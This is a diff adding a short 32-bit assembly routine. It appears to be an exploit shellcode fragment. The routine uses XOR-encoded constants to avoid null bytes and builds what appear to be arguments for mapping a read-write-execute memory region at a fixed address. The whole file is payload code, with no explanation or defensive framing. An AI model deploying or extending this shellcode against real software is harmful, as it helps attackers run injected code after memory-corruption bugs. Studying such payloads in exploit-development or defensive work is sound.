@@ -1,0 +1,30 @@
+[bits 32]
+    lea eax, [esp]
+
+    mov dword [eax+0x8], 0x40404101
+    xor dword [eax+0x8], 0x01010101
+
+    mov dword [eax+0xc], 0x01011101
+    xor dword [eax+0xc], 0x01010101
+
+    mov dword [eax+0x10], 0x01010106
+    xor dword [eax+0x10], 0x01010101
+
+    mov dword [eax+0x14], 0x01010133
+    xor dword [eax+0x14], 0x01010101
+
+    mov dword [eax+0x18], 0xffffffff
+
+    mov dword [eax+0x1c], 0xffffffff  
+    xor dword [eax+0x1c], 0xffffffff
+
+    mov dword [eax+0x28], 0x40404101
+    xor dword [eax+0x28], 0x01010101
+
+    mov dword [eax+0x30], 0x01010119
+    xor dword [eax+0x30], 0x01010101
+
+    mov dword [eax+0x34], 0x40404101
+    xor dword [eax+0x34], 0x01010101
+
+    ret
